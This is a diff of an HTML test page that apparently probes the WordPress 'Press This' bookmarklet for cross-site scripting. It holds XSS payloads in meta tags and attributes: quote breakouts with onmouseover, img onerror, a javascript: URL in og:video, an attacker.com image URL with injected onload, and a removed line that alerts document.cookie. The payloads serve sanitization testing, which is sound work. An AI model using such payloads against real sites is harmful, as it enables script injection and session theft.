@@ -2,18 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XSS Trap for Press This</title>
+    <title>Advanced XSS Test for Press This</title>
     
-    <meta property="og:description" content="Normal Description <script>alert('XSS 1')</script>">
+    <meta name="description" content='Quote test" onmouseover="alert(1)'>
     
-    <meta name="twitter:description" content='Test Content" onmouseover="alert(document.cookie)" style="position:absolute;width:100%;height:100%;top:0;left:0;" x="'>
+    <meta property="og:description" content="&lt;img src=x onerror=alert(1)&gt;">
     
-    <meta name="description" content="See this image <img src=x onerror=alert('XSS_via_IMG')>">
+    <meta property="og:video" content="javascript:alert(1)//http://youtube.com/v/123">
+
+    <meta property="og:image" content="http://attacker.com/image.jpg?a=&quot;onload=&quot;alert(1)">
 
 </head>
 <body>
-    <h1>Press This Plugin Vulnerability POC</h1>
-    <p>Please click the 'Press This' bookmarklet on this page.</p>
-    <img src="https://via.placeholder.com/150" alt="Test Image">
+    <h1>Press This Sanitization Probe</h1>
+    <p>Use the bookmarklet on this page.</p>
+    
+    <img src="http://placehold.it/300x300" data-custom="' onmouseover='alert(1)">
 </body>
 </html>
